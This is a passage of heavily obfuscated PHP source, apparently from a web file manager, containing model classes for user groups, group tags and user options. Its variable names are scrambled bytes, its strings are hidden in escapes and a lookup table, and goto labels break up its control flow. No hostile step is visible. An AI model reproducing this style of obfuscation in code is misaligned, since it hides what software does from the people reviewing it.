$ƒáÂ¾©¦ . $·Ôêó¼ [551]; $Ø»¤©Ÿâ = array($Ø»¤©Ÿâ, array($·Ôêó¼ [521] => array($·Ôêó¼ [383], $†ûú™²³))); } $Ø»¤©Ÿâ = $this->parseWhereLike($Ø»¤©Ÿâ); $ÙÓÜÎ­‹ = $this->_makeOrder()->where($Ø»¤©Ÿâ)->selectPage(20); $ÙÓÜÎ­‹ = $ÙÓÜÎ­‹ ? $ÙÓÜÎ­‹ : array($·Ôêó¼ [369] => array(), $·Ôêó¼ [366] => array()); if (!$ÙÓÜÎ­‹ || count($ÙÓÜÎ­‹[$·Ôêó¼ [369]]) < 5 && Input::check($¦€¤‘ÕŸ, $·Ôêó¼ [318])) { $ê³®ô’Ö = $this->groupChildrenAll($ƒáÂ¾©¦); $—öŸàœ = $this->_searchFromMeta($·Ôêó¼ [464], $¦€¤‘ÕŸ, 10, $ê³®ô’Ö); $Ìú®¬âÆ = $this->_searchFromMeta($·Ôêó¼ [465], $¦€¤‘ÕŸ, 10, $ê³®ô’Ö); $õ…¹«õ = array_merge($—öŸàœ, $Ìú®¬âÆ, $ÙÓÜÎ­‹[$·Ôêó¼ [369]]); $ÙÓÜÎ­‹[$·Ôêó¼ [369]] = array_unique_by_key($õ…¹«õ, $·Ôêó¼ [1865]); $ÙÓÜÎ­‹[$·Ôêó¼ [366]][$·Ôêó¼ [367]] = count($ÙÓÜÎ­‹[$·Ôêó¼ [369]]); $ÙÓÜÎ­‹[$·Ôêó¼ [366]][$·Ôêó¼ [368]] = ceil($ÙÓÜÎ­‹[$·Ôêó¼ [366]][$·Ôêó¼ [367]] / $ÙÓÜÎ­‹[$·Ôêó¼ [366]][$·Ôêó¼ [363]]); } $this->_listDataApply($ÙÓÜÎ­‹[$·Ôêó¼ [369]]); return $ÙÓÜÎ­‹; } protected function groupChildrenAll($İÈ§ôû›) { $­²¢Ã…ì =& $_SERVER[Ã¶¡¶„æ]; if (!$İÈ§ôû›) { return !1; } if (is_string($İÈ§ôû›)) { $İÈ§ôû› = array($İÈ§ôû›); } $İÙÍÈÏÅ = $İÈ§ôû›; foreach ($İÈ§ôû› as $—³®€Âª) { $Ï£ï¦¥“ = $this->getInfoSimple($—³®€Âª); $ÔİÒ—¹Ñ = array($­²¢Ã…ì[521] => array($­²¢Ã…ì[383], $Ï£ï¦¥“[$­²¢Ã…ì[521]] . $—³®€Âª . $­²¢Ã…ì[551])); $·ş–¤õ÷ = $this->field($­²¢Ã…ì[1865])->where($ÔİÒ—¹Ñ)->select(); $İÙÍÈÏÅ = array_merge($İÙÍÈÏÅ, array_to_keyvalue($·ş–¤õ÷, $­²¢Ã…ì[12], $­²¢Ã…ì[1865])); } return array_unique($İÙÍÈÏÅ); } private function _searchFromMeta($öÕ¯Ş¥Ï, $Ù·İœĞè, $›ª±Ä’Ä, $¶î­˜Ò™) { $Øôš™µ =& $_SERVER[Ã¶¡¶„æ]; $Ù·İœĞè = strtolower($Ù·İœĞè); $İõœÆ™ = array($Øôš™µ[94] => $öÕ¯Ş¥Ï, $Øôš™µ[374] => array($Øôš™µ[383], "\x25{$Ù·İœĞè}\x25")); $İõœÆ™ = $this->parseWhereLike($İõœÆ™); if ($¶î­˜Ò™) { $İõœÆ™[$Øôš™µ[1865]] = array($Øôš™µ[7], $¶î­˜Ò™); } $î£Ÿ‡»Î = Model($Øôš™µ[1964])->where($İõœÆ™)->limit($›ª±Ä’Ä)->select(); if (!$î£Ÿ‡»Î) { return array(); } $î£Ÿ‡»Î = array_to_keyvalue($î£Ÿ‡»Î, $Øôš™µ[12], $Øôš™µ[1865]); $…ÆÅœ±² = $this->where(array($Øôš™µ[1953] => array($Øôš™µ[7], $î£Ÿ‡»Î)))->select(); if (!$…ÆÅœ±²) { return array(); } return $…ÆÅœ±²; } protected function _listDataApplyItem($‘Ğ½«ËÑ) { $îƒÏÅ±è = array($‘Ğ½«ËÑ); $this->_listDataApply($îƒÏÅ±è); return $îƒÏÅ±è[0]; } protected function _listDataApply(&$ƒıç´şÈ) { $¢Ñ‚¼»£ =& $_SERVER[Ã¶¡¶„æ]; if (!$ƒıç´şÈ) { return; } $ãƒŒù‘ù = array_to_keyvalue($ƒıç´şÈ, $¢Ñ‚¼»£[12], $¢Ñ‚¼»£[1865]); $this->_listAppendChildren($ƒıç´şÈ); $this->_listAppendChildrenMember($ƒıç´şÈ); $this->_listAppendMeta($ƒıç´şÈ, $ãƒŒù‘ù); $this->_listAppendParent($ƒıç´şÈ); $this->_listAppendSourceRoot($ƒıç´şÈ, $ãƒŒù‘ù); } private function _listAppendChildren(&$“ÜÓ¦Î) { $Ğ¾ò³ë =& $_SERVER[Ã¶¡¶„æ]; $²¸£ë§ = array_to_keyvalue($“ÜÓ¦Î, $Ğ¾ò³ë[12], $Ğ¾ò³ë[1865]); $ÜÂ·ƒ°  = array($Ğ¾ò³ë[432] => array($Ğ¾ò³ë[7], $²¸£ë§)); $¸ÑÆ·€› = array($Ğ¾ò³ë[432], $Ğ¾ò³ë[1965] => $Ğ¾ò³ë[500]); $©óÚªÓ­ = $this->field($¸ÑÆ·€›)->where($ÜÂ·ƒ° )->group($Ğ¾ò³ë[432])->select(); $¿¿ˆë–² = array_to_keyvalue($©óÚªÓ­, $Ğ¾ò³ë[432], $Ğ¾ò³ë[500]); foreach ($“ÜÓ¦Î as &$›¯Ùöó«) { $…ÊÔºêØ = $›¯Ùöó«[$Ğ¾ò³ë[1865]]; $›¯Ùöó«[$Ğ¾ò³ë[1966]] = isset($¿¿ˆë–²[$…ÊÔºêØ]) ? intval($¿¿ˆë–²[$…ÊÔºêØ]) : !1; } unset($›¯Ùöó«); } private function _listAppendChildrenMember(&$ŸÍõ®Ÿ) { $•äæÉÔé =& $_SERVER[Ã¶¡¶„æ]; $¢ìªèó˜ = array_to_keyvalue($ŸÍõ®Ÿ, $•äæÉÔé[12], $•äæÉÔé[1865]); $Ö°ÀŸ™´ = array($•äæÉÔé[1865] => array($•äæÉÔé[7], $¢ìªèó˜)); $À£ù—Şû = array($•äæÉÔé[1865], $•äæÉÔé[1965] => $•äæÉÔé[500]); $ÜÓ«»ß = Model($•äæÉÔé[1955])->field($À£ù—Şû)->where($Ö°ÀŸ™´)->group($•äæÉÔé[1865])->select(); $¨ııó¸ô = array_to_keyvalue($ÜÓ«»ß, $•äæÉÔé[1865], $•äæÉÔé[500]); foreach ($ŸÍõ®Ÿ as &$’ÓÄ„²¬) { $Û§¼£ = $’ÓÄ„²¬[$•äæÉÔé[1865]]; $’ÓÄ„²¬[$•äæÉÔé[1967]] = isset($¨ııó¸ô[$Û§¼£]) ? intval($¨ııó¸ô[$Û§¼£]) : !1; } unset($’ÓÄ„²¬); } private function _listAppendMeta(&$¿˜“×—º, $ŸØí¯¯º) { $Â¢¤ˆİ =& $_SERVER[Ã¶¡¶„æ]; $¸¢ºûÓÅ = array($Â¢¤ˆİ[1865] => array($Â¢¤ˆİ[7], $ŸØí¯¯º)); $äï¬ğ¬× = Model($Â¢¤ˆİ[1954])->where($¸¢ºûÓÅ)->select(); $äï¬ğ¬× = array_to_keyvalue_group($äï¬ğ¬×, $Â¢¤ˆİ[1865]); foreach ($äï¬ğ¬× as &$²ÎÑ£Ã¿) { $²ÎÑ£Ã¿ = array_to_keyvalue($²ÎÑ£Ã¿, $Â¢¤ˆİ[94], $Â¢¤ˆİ[374]); } unset($²ÎÑ£Ã¿); foreach ($¿˜“×—º as &$¸Â‚“–) { $¸Â‚“–[$Â¢¤ˆİ[466]] = array(); if (isset($äï¬ğ¬×[$¸Â‚“–[$Â¢¤ˆİ[1865]]])) { $¸Â‚“–[$Â¢¤ˆİ[466]] = $äï¬ğ¬×[$¸Â‚“–[$Â¢¤ˆİ[1865]]]; } } unset($¸Â‚“–); } protected function parentLevelArray($ƒœİîÉª) { $é„Åô”Ö =& $_SERVER[Ã¶¡¶„æ]; $ƒœİîÉª = explode($é„Åô”Ö[50], trim($ƒœİîÉª, $é„Åô”Ö[50])); $ƒœİîÉª = array_remove_value($ƒœİîÉª, $é„Åô”Ö[197]); return $ƒœİîÉª; } protected function parentInGroup($Úï¬ªá…, $«Â°Â¹¸) { $²ÚÓŒÎ¸ =& $_SERVER[Ã¶¡¶„æ]; $äæ‹“ÓŸ = $this->getInfoSimple($Úï¬ªá…); if (!$äæ‹“ÓŸ) { return !0; } $ “ğ¢‹­ = $this->parentLevelArray($äæ‹“ÓŸ[$²ÚÓŒÎ¸[521]]); $ “ğ¢‹­[] = $Úï¬ªá…; foreach ($ “ğ¢‹­ as $Úï¬ªá…) { if (in_array($Úï¬ªá… . $²ÚÓŒÎ¸[12], $«Â°Â¹¸)) { return !0; } } return !1; } private function _listAppendParent(&$ò¤¦Ïû¢) { $ëÃ£˜€£ =& $_SERVER[Ã¶¡¶„æ]; $³Éıõ¡ß = array(); foreach ($ò¤¦Ïû¢ as &$£•‰˜‘¬) { $³Éıõ¡ß[$£•‰˜‘¬[$ëÃ£˜€£[1865]]] = $£•‰˜‘¬[$ëÃ£˜€£[32]]; $Èùãü“ = $this->parentLevelArray($£•‰˜‘¬[$ëÃ£˜€£[521]]); foreach ($Èùãü“ as $·èñ™í ) { if (!isset($³Éıõ¡ß[$·èñ™í ])) { $³Éıõ¡ß[$·èñ™í ] = 0; } } } unset($£•‰˜‘¬); foreach ($³Éıõ¡ß as $½ª‹Â„ı => $ªÃŠÓ’) { if ($ªÃŠÓ’) { continue; } $æ—š£š = $this->getInfoSimple($½ª‹Â„ı); $³Éıõ¡ß[$½ª‹Â„ı] = $æ—š£š[$ëÃ£˜€£[32]]; } $ĞÌ«„—Á = $GLOBALS[$ëÃ£˜€£[6]][$ëÃ£˜€£[89]][$ëÃ£˜€£[1968]]; if ($GLOBALS[$ëÃ£˜€£[503]] == $ëÃ£˜€£[88]) { $ĞÌ«„—Á = !1; } foreach ($ò¤¦Ïû¢ as &$£•‰˜‘¬) { $Èùãü“ = $this->parentLevelArray($£•‰˜‘¬[$ëÃ£˜€£[521]]); $öÛ¿ö®ı = $ëÃ£˜€£[12]; foreach ($Èùãü“ as $½ª‹Â„ı => $·èñ™í ) { if ($ĞÌ«„—Á && $½ª‹Â„ı == 0) { continue; } $öÛ¿ö®ı .= $³Éıõ¡ß[$·èñ™í ] . $ëÃ£˜€£[8]; } if ($Èùãü“) { $öÛ¿ö®ı .= $£•‰˜‘¬[$ëÃ£˜€£[32]]; } $£•‰˜‘¬[$ëÃ£˜€£[526]] = str_replace($ëÃ£˜€£[529], $ëÃ£˜€£[8], $öÛ¿ö®ı); } unset($£•‰˜‘¬); } private function _listAppendSourceRoot(&$–æåäƒ, $òßêŸ…ş) { $‰˜¸¹ùÃ =& $_SERVER[Ã¶¡¶„æ]; $¬æİğÈ¨ = Model($‰˜¸¹ùÃ[831])->listSourceRoot(SourceModel::TYPE_GROUP, $òßêŸ…ş); $¬æİğÈ¨ = array_to_keyvalue($¬æİğÈ¨, $‰˜¸¹ùÃ[505]); $¬æİğÈ¨ = array_remove_key($¬æİğÈ¨, $‰˜¸¹ùÃ[505]); foreach ($–æåäƒ as &$­Ïçşú) { $­Ïçşú[$‰˜¸¹ùÃ[86]] = $¬æİğÈ¨[$­Ïçşú[$‰˜¸¹ùÃ[1865]]] ? $¬æİğÈ¨[$­Ïçşú[$‰˜¸¹ùÃ[1865]]] : array(); } unset($­Ïçşú); } protected function groupMerge($ğö·Ù‹€) { $ğö·Ù‹€ = array_values(array_unique($ğö·Ù‹€)); $Õ€¬À = array(); for ($õëŒõ‹ = 0; $õëŒõ‹ < count($ğö·Ù‹€); $õëŒõ‹++) { $è•ª Ø’ = !1; for ($Ú‹‚§… = 0; $Ú‹‚§… < count($ğö·Ù‹€); $Ú‹‚§…++) { if ($õëŒõ‹ == $Ú‹‚§…) { continue; } if ($this->isParentOf($ğö·Ù‹€[$Ú‹‚§…], $ğö·Ù‹€[$õëŒõ‹])) { $è•ª Ø’ = !0; break; } } if (!$è•ª Ø’) { $Õ€¬À[] = $ğö·Ù‹€[$õëŒõ‹]; } } return $Õ€¬À; } protected function isParentOf($¹¡ô’ö…, $¾Ã¥ä‹ô) { $ÆÙÚë =& $_SERVER[Ã¶¡¶„æ]; if (!$¹¡ô’ö… || !$¾Ã¥ä‹ô || $¹¡ô’ö… == $¾Ã¥ä‹ô) { return !1; } $éüù©» = $this->getInfoSimple($¹¡ô’ö…); $§·è¡³ğ = $this->getInfoSimple($¾Ã¥ä‹ô); $üôÏ¹Î¸ = $éüù©»[$ÆÙÚë[521]] . $¹¡ô’ö… . $ÆÙÚë[50]; if (substr($§·è¡³ğ[$ÆÙÚë[521]], 0, strlen($üôÏ¹Î¸)) == $üôÏ¹Î¸) { return !0; } return !1; } public function groupShowRoot($»ËØ¾˜, $®Èà™® = false) { $óÙì³™“ =& $_SERVER[Ã¶¡¶„æ]; $ÚĞ¼ûŸÉ = $this->getInfo($»ËØ¾˜); if (!$ÚĞ¼ûŸÉ) { return array(); } $ÔÎ†–° = $this->parentLevelArray($ÚĞ¼ûŸÉ[$óÙì³™“[521]]); $òÙ¶¦á = array($»ËØ¾˜); if (count($ÔÎ†–°) == 0) { return $òÙ¶¦á; } if ($®Èà™® && count($ÔÎ†–°) == 1) { return $òÙ¶¦á; } if (!$ÚĞ¼ûŸÉ[$óÙì³™“[466]] || !isset($ÚĞ¼ûŸÉ[$óÙì³™“[466]][$óÙì³™“[1951]]) || $ÚĞ¼ûŸÉ[$óÙì³™“[466]][$óÙì³™“[1951]] == $óÙì³™“[1920]) { return $this->groupShowRoot($ÔÎ†–°[count($ÔÎ†–°) - 1], $®Èà™®); } if ($ÚĞ¼ûŸÉ[$óÙì³™“[466]][$óÙì³™“[1951]] == $óÙì³™“[357]) { $Ø÷»ÆŞ = explode($óÙì³™“[50], $ÚĞ¼ûŸÉ[$óÙì³™“[466]][$óÙì³™“[1952]]); if ($Ø÷»ÆŞ) { $òÙ¶¦á = array_merge($òÙ¶¦á, $Ø÷»ÆŞ); } } return $òÙ¶¦á; } protected function resetParentLevel() { $šõâÀ³ğ =& $_SERVER[Ã¶¡¶„æ]; $·¶¸ó¯á = $šõâÀ³ğ[1865]; $¨ªÙá = $this->select(); $¨ªÙá = array_to_keyvalue($¨ªÙá, $·¶¸ó¯á); foreach ($¨ªÙá as $ôíùø¢ö) { $Õ¡éÒù = $ôíùø¢ö; $æ±–Ìû = array(); while ($Õ¡éÒù[$šõâÀ³ğ[432]] != 0) { $æ±–Ìû[] = $Õ¡éÒù[$šõâÀ³ğ[432]]; $Õ¡éÒù = $¨ªÙá[$Õ¡éÒù[$šõâÀ³ğ[432]]]; } $æ±–Ìû[] = 0; $æ±–Ìû = $šõâÀ³ğ[50] . implode($šõâÀ³ğ[50], array_reverse($æ±–Ìû)) . $šõâÀ³ğ[50]; $this->setNamePinyin($ôíùø¢ö[$·¶¸ó¯á], $ôíùø¢ö[$šõâÀ³ğ[32]]); $this->where(array($·¶¸ó¯á => $ôíùø¢ö[$·¶¸ó¯á]))->save(array($šõâÀ³ğ[590] => $æ±–Ìû)); } return $¨ªÙá; } public function groupNameAuto($Ä±ãñœ», $’÷ñëíè) { $Øê‹ü „ =& $_SERVER[Ã¶¡¶„æ]; $ä·Õ”ªÛ = $this->where(array($Øê‹ü „[401] => $Ä±ãñœ»))->getField($Øê‹ü „[32], !0); if (!$ä·Õ”ªÛ || !in_array($’÷ñëíè, $ä·Õ”ªÛ)) { return $’÷ñëíè; } for ($èÛˆò = 1; $èÛˆò <= count($ä·Õ”ªÛ) + 1; $èÛˆò++) { $öØÆù–· = $’÷ñëíè . "\x28{$èÛˆò}\x29"; if (!in_array($öØÆù–·, $ä·Õ”ªÛ)) { return $öØÆù–·; } } } public function groupSwitch($š°ãïÕ¢, $Ç€ÁÀ­) { $ÏÒ»ºò =& $_SERVER[Ã¶¡¶„æ]; $µà˜©¡Ê = array($ÏÒ»ºò[1865] => array($ÏÒ»ºò[7], array($š°ãïÕ¢, $Ç€ÁÀ­))); $ÑĞ‰šë¿ = $this->where($µà˜©¡Ê)->select(); $ÑĞ‰šë¿ = array_to_keyvalue($ÑĞ‰šë¿, $ÏÒ»ºò[1865]); if (!isset($ÑĞ‰šë¿[$š°ãïÕ¢]) || !isset($ÑĞ‰šë¿[$Ç€ÁÀ­]) || $ÑĞ‰šë¿[$š°ãïÕ¢][$ÏÒ»ºò[432]] == 0) { return !1; } $µà˜©¡Ê = array($ÏÒ»ºò[1865] => $š°ãïÕ¢); $¼“ “¼á = Model($ÏÒ»ºò[1955])->where($µà˜©¡Ê)->select(); if (!$¼“ “¼á) { $¼“ “¼á = array(); } foreach ($¼“ “¼á as $Æä’ªş) { $Úçšóï‡ = $Æä’ªş[$ÏÒ»ºò[1676]]; $µà˜©¡Ê = array($ÏÒ»ºò[1676] => $Úçšóï‡, $ÏÒ»ºò[1865] => $Ç€ÁÀ­); $Œ€Ç»õ = Model($ÏÒ»ºò[1955])->where($µà˜©¡Ê)->find(); if (!$Œ€Ç»õ) { $±ª³úçš = array($Ç€ÁÀ­ => $Æä’ªş[$ÏÒ»ºò[1969]]); Model($ÏÒ»ºò[535])->userGroupAdd($Úçšóï‡, $±ª³úçš); } Model($ÏÒ»ºò[535])->userGroupRemove($Úçšóï‡, $š°ãïÕ¢); } $µà˜©¡Ê = array($ÏÒ»ºò[411] => 2, $ÏÒ»ºò[432] => 0, $ÏÒ»ºò[410] => 1, $ÏÒ»ºò[505] => array($ÏÒ»ºò[7], array($š°ãïÕ¢, $Ç€ÁÀ­))); $â»’à¡ê = Model($ÏÒ»ºò[831])->where($µà˜©¡Ê)->field($ÏÒ»ºò[1970])->select(); $â»’à¡ê = array_to_keyvalue($â»’à¡ê, $ÏÒ»ºò[505], $ÏÒ»ºò[402]); $œê Ïä“ = !empty($â»’à¡ê[$š°ãïÕ¢]) ? $â»’à¡ê[$š°ãïÕ¢] : !1; if ($œê Ïä“) { if (!$â»’à¡ê[$Ç€ÁÀ­]) { $â»’à¡ê[$Ç€ÁÀ­] = Model($ÏÒ»ºò[831])->groupRootAdd($Ç€ÁÀ­); } $ØÙäîñ = $â»’à¡ê[$Ç€ÁÀ­]; $µà˜©¡Ê = array($ÏÒ»ºò[432] => $œê Ïä“); $â»’à¡ê = Model($ÏÒ»ºò[831])->where($µà˜©¡Ê)->field($ÏÒ»ºò[1971])->select(); if (!$â»’à¡ê) { $â»’à¡ê = array(); } Model($ÏÒ»ºò[831])->moveClearAuth = !1; foreach ($â»’à¡ê as $·ó§–ç) { $î…½—Âê = $·ó§–ç[$ÏÒ»ºò[410]] == $ÏÒ»ºò[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÏÒ»ºò[831])->move($·ó§–ç[$ÏÒ»ºò[402]], $ØÙäîñ, $î…½—Âê); } Model($ÏÒ»ºò[831])->moveClearAuth = !0; $µà˜©¡Ê = array($ÏÒ»ºò[411] => 2, $ÏÒ»ºò[505] => $š°ãïÕ¢); $à³–±é = array($ÏÒ»ºò[505] => $Ç€ÁÀ­); Model($ÏÒ»ºò[1972])->where($µà˜©¡Ê)->save($à³–±é); Model($ÏÒ»ºò[1973])->where($µà˜©¡Ê)->save($à³–±é); } $this->_changeChildLevel($ÑĞ‰šë¿[$š°ãïÕ¢], $ÑĞ‰šë¿[$Ç€ÁÀ­], !0); $this->where(array($ÏÒ»ºò[432] => $š°ãïÕ¢))->save(array($ÏÒ»ºò[432] => $Ç€ÁÀ­)); $this->_clearChildrenCache($ÑĞ‰šë¿[$Ç€ÁÀ­]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ı†ô¨—Á) { $À¨¯ş„¡ =& $_SERVER[Ã¶¡¶„æ]; return array($À¨¯ş„¡[1974] => array($ı†ô¨—Á[0], $À¨¯ş„¡[1975]), $À¨¯ş„¡[1976] => array($ı†ô¨—Á[0], $À¨¯ş„¡[1977])); } protected function get($„ òá¥) { $ÇïÊÛú =& $_SERVER[Ã¶¡¶„æ]; $èÌéŞ¿¢ = Model($ÇïÊÛú[522])->metaGet($„ òá¥, $ÇïÊÛú[1978]); $¡Ç¿Ûã¨ = json_decode($èÌéŞ¿¢, !0); return $¡Ç¿Ûã¨ ? $¡Ç¿Ûã¨ : array($ÇïÊÛú[1979] => $ÇïÊÛú[88], $ÇïÊÛú[369] => array()); } protected function set($çƒÄ‰ÉÏ, $‰µ¯ØÎ•) { $ù‡¸æ¸Ë =& $_SERVER[Ã¶¡¶„æ]; $‰µ¯ØÎ• = $‰µ¯ØÎ• ? $‰µ¯ØÎ• : array($ù‡¸æ¸Ë[1979] => $ù‡¸æ¸Ë[88], $ù‡¸æ¸Ë[369] => array()); return Model($ù‡¸æ¸Ë[522])->metaSet($çƒÄ‰ÉÏ, $ù‡¸æ¸Ë[1978], json_encode($‰µ¯ØÎ•)); } protected function getByTagID($½¡ÑÄµ§, $¿ùè¡Ù) { $®–¿¡ † =& $_SERVER[Ã¶¡¶„æ]; if (!$½¡ÑÄµ§ || !$¿ùè¡Ù) { return !1; } if (!Model($®–¿¡ †[522])->getInfoSimple($½¡ÑÄµ§)) { return !1; } $¹éŞÓá = $this->get($½¡ÑÄµ§); if (!$¹éŞÓá || !isset($¹éŞÓá[$®–¿¡ †[369]])) { return !1; } $ìÒÀ± = array_find_by_field($¹éŞÓá[$®–¿¡ †[369]], $®–¿¡ †[399], $¿ùè¡Ù); return is_array($ìÒÀ±) ? $ìÒÀ± : !1; } public function listSource($³ğÇñùº, $ØË¡÷€’) { $ÃÇ„æ€Ã =& $_SERVER[Ã¶¡¶„æ]; if ($ØË¡÷€’ && !is_array($ØË¡÷€’)) { $ØË¡÷€’ = array($ØË¡÷€’); } $ºŠƒ§Ş = $this->listData($³ğÇñùº); $¯‘ôÑ½ú = array(); foreach ($ºŠƒ§Ş as $µ˜àå­) { $ÉÆÖşŒ = $µ˜àå­[$ÃÇ„æ€Ã[84]]; if (!$ÉÆÖşŒ) { continue; } if (!isset($¯‘ôÑ½ú[$ÉÆÖşŒ])) { $¯‘ôÑ½ú[$ÉÆÖşŒ] = array(); } $¯‘ôÑ½ú[$ÉÆÖşŒ][] = $µ˜àå­[$ÃÇ„æ€Ã[426]]; } $º€ÁŞ€¾ = array(); foreach ($¯‘ôÑ½ú as $¿é„öò => $ÕéÈ€«) { $º÷ïñßí = !0; if (!$ØË¡÷€’) { $º€ÁŞ€¾[] = $¿é„öò; continue; } foreach ($ØË¡÷€’ as $—¹ê—‚¼) { if (!in_array($—¹ê—‚¼, $ÕéÈ€«)) { $º÷ïñßí = !1; break; } } if ($º÷ïñßí) { $º€ÁŞ€¾[] = $¿é„öò; } } if (!$º€ÁŞ€¾) { return array(); } $áõ¸úÖí = array($ÃÇ„æ€Ã[417] => array($ÃÇ„æ€Ã[418], $º€ÁŞ€¾), $ÃÇ„æ€Ã[505] => $³ğÇñùº, $ÃÇ„æ€Ã[411] => SourceModel::TYPE_GROUP); $è¬ö¥µ = Model($ÃÇ„æ€Ã[1350])->listSource($áõ¸úÖí); if (!$è¬ö¥µ || count($º€ÁŞ€¾) == $è¬ö¥µ[$ÃÇ„æ€Ã[366]][$ÃÇ„æ€Ã[367]]) { return $è¬ö¥µ; } $˜¿äŠ¢ = array(); $¦áöÁ‚˜ = array_to_keyvalue($è¬ö¥µ[$ÃÇ„æ€Ã[82]], $ÃÇ„æ€Ã[12], $ÃÇ„æ€Ã[402]); $–×½ä¥‰ = array_to_keyvalue($è¬ö¥µ[$ÃÇ„æ€Ã[83]], $ÃÇ„æ€Ã[12], $ÃÇ„æ€Ã[402]); $úÚıÍ–Æ = array_merge($–×½ä¥‰, $¦áöÁ‚˜); foreach ($º€ÁŞ€¾ as $ÉÆÖşŒ) { if (!in_array($ÉÆÖşŒ, $úÚıÍ–Æ)) { $˜¿äŠ¢[] = $ÉÆÖşŒ; } } if ($˜¿äŠ¢) { $this->removeBySource($³ğÇñùº, $˜¿äŠ¢); } return $è¬ö¥µ; } protected function listData($ù¢‚‹ñí) { $ë¸Ô Üä =& $_SERVER[Ã¶¡¶„æ]; $…òˆÑü¼ = array($ë¸Ô Üä[1667] => 0, $ë¸Ô Üä[484] => array($ë¸Ô Üä[1980], 0), $ë¸Ô Üä[422] => $ë¸Ô Üä[1981] . $ù¢‚‹ñí); $Óß‡‹Ñõ = $ë¸Ô Üä[1982]; $å°ƒ¦ñ = $this->field($Óß‡‹Ñõ)->where($…òˆÑü¼)->order($ë¸Ô Üä[1983])->select(); return $å°ƒ¦ñ ? $å°ƒ¦ñ : array(); } protected function addToTag($§¼‚˜¦Û, $ùäÓ›ÂÀ, $µèèìª) { $ööóˆ’“ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->getByTagID($§¼‚˜¦Û, $µèèìª) || !$ùäÓ›ÂÀ) { return !1; } if (!Model($ööóˆ’“[831])->pathInfo($ùäÓ›ÂÀ)) { return !1; } $ˆĞ›œÛ³ = array($ööóˆ’“[1667] => 0, $ööóˆ’“[484] => $µèèìª, $ööóˆ’“[421] => $ùäÓ›ÂÀ, $ööóˆ’“[422] => $ööóˆ’“[1984] . $§¼‚˜¦Û, $ööóˆ’“[420] => $ööóˆ’“[12], $ööóˆ’“[1869] => 0); if ($this->where($ˆĞ›œÛ³)->find()) { return !1; } return $this->add($ˆĞ›œÛ³); } protected function removeFromTag($ùê¥ùº, $²õ®×ğŸ, $Ôé‘§…„) { $ÈóÌ´Šã =& $_SERVER[Ã¶¡¶„æ]; if (!$this->getByTagID($ùê¥ùº, $Ôé‘§…„) || !$²õ®×ğŸ) { return !1; } if (is_array($²õ®×ğŸ)) { $²õ®×ğŸ = array($ÈóÌ´Šã[7], $²õ®×ğŸ); } $ô·—§Óª = array($ÈóÌ´Šã[1667] => 0, $ÈóÌ´Šã[484] => $Ôé‘§…„, $ÈóÌ´Šã[422] => $ÈóÌ´Šã[1984] . $ùê¥ùº, $ÈóÌ´Šã[421] => $²õ®×ğŸ); return $this->where($ô·—§Óª)->delete(); } protected function removeByTag($ŞĞÍÀòÜ, $êÉê²) { $Æı‡Õë¥ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->getByTagID($ŞĞÍÀòÜ, $êÉê²)) { return !1; } $Éë¡›“• = array($Æı‡Õë¥[1667] => 0, $Æı‡Õë¥[484] => $êÉê², $Æı‡Õë¥[422] => $Æı‡Õë¥[1984] . $ŞĞÍÀòÜ); return $this->where($Éë¡›“•)->delete(); } protected function removeBySource($ˆÌíÂ”´, $¶Šñ÷ñº) { $’±ËÅÖ¡ =& $_SERVER[Ã¶¡¶„æ]; if (!$ˆÌíÂ”´ || !$¶Šñ÷ñº) { return !1; } if (is_array($¶Šñ÷ñº)) { $¶Šñ÷ñº = array($’±ËÅÖ¡[7], $¶Šñ÷ñº); } $ŠÑ¤•Ÿ = array($’±ËÅÖ¡[1667] => 0, $’±ËÅÖ¡[421] => $¶Šñ÷ñº, $’±ËÅÖ¡[484] => array($’±ËÅÖ¡[1028], 0), $’±ËÅÖ¡[422] => $’±ËÅÖ¡[1984] . $ˆÌíÂ”´); return $this->where($ŠÑ¤•Ÿ)->delete(); } } goto AÌÑÙª¨“ë; DÇœ©ÈÛ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\157\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($†øÜß¾¶) { $´ïãñò¬ =& $_SERVER[Ã¶¡¶„æ]; if (!defined($´ïãñò¬[475])) { define($´ïãñò¬[475], 0); } return "\125\x73\145\162\117\160\164\x69\157\x6e\x5f{$†øÜß¾¶}\x5f" . USER_ID; } protected function filterWhere($í‚ÆòÚ©) { $Òš÷º±Ô =& $_SERVER[Ã¶¡¶„æ]; if (!defined($Òš÷º±Ô[475])) { define($Òš÷º±Ô[475], 0); } $í‚ÆòÚ©[$Òš÷º±Ô[1676]] = USER_ID; return $í‚ÆòÚ©; } public function cacheRemoveUser($­€¼›Ó‘, $ëéçŞ™) { return Cache::remove("\125\163\x65\x72\x4f\160\x74\151\x6f\x6e\137{$­€¼›Ó‘}\137" . $ëéçŞ™); } protected function optionDefault($¤Ñí¸ÍÑ = '') { $÷ÁÄ¡ =& $_SERVER[Ã¶¡¶„æ]; if ($¤Ñí¸ÍÑ == $÷ÁÄ¡[12]) { return $GLOBALS[$÷ÁÄ¡[6]][$÷ÁÄ¡[2352]]; } if ($¤Ñí¸ÍÑ == $÷ÁÄ¡[2353]) { return $GLOBALS[$÷ÁÄ¡[6]][$÷ÁÄ¡[2354]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\x61\x67\114\151\163\x74"; public $modelType = "\125\x73\x65\162\x4f\x70\164\151\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\x79\x6c\x65", "\163\157\x72\164"); public function listData($˜Ûì¨» = false, $òíşãÒ° = "\163\157\162\164", $îÍĞéĞ› = false) { return parent::listData($˜Ûì¨», $òíşãÒ°, $îÍĞéĞ›); } public function remove($‘™ß´°¸) { return parent::remove($‘™ß´°¸); } public function add($ºß±úÔÕ, $¡ÅáÛ‡¨ = "\x6c\x61\x62\145\x6c\55\147\x72\145\x79\x2d\x6e\157\162\x6d\141\154") { $ä¨øˆî =& $_SERVER[Ã¶¡¶„æ]; if ($this->findByName($ºß±úÔÕ)) { return !1; } $¹‹íí«É = array($ä¨øˆî[420] => $ºß±úÔÕ, $ä¨øˆî[485] => $¡ÅáÛ‡¨, $ä¨øˆî[1869] => $this->getSort($ä¨øˆî[258]) + 1); return parent::insert($¹‹íí«É); } public function update($£àÅœ‹Ê, $ŠÃ‚°é‘) { 